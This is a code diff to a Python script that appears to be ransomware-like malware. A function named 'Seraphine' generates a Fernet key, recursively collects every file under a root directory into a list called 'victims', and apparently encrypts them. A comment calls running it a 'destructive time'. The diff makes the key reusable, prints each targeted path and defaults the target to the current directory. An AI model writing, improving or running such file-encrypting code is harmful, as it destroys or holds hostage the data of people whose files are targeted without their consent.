@@ -7,9 +7,13 @@ from cryptography.fernet import Fernet
 # Executing this code is on your responsible only, have fun and destructive time <3
 
 def create_key():
+    if os.path.exists("./key.ky"):
+        return read_key()
+    
     key = Fernet.generate_key()
     with open("key.ky", "wb") as keyFile:
         keyFile.write(key)
+    return key
 
 
 def read_key():
@@ -31,6 +35,7 @@ def extract_files_from_root(root):
         for file in files:
             path = os.path.join(root, file)
             all_files.append(path)
+            print(path)
         for dir in dirs:
             all_files.extend(extract_files_from_root(os.path.join(root, dir)))
     return all_files
@@ -60,7 +65,7 @@ def execute_file(path, executer):
         print("NOM NOM")
 
 
-def Seraphine(root):
+def Seraphine(root = "."):
     key = create_key()
     fernet = create_fernet(key)
     victims = extract_files_from_root(root)
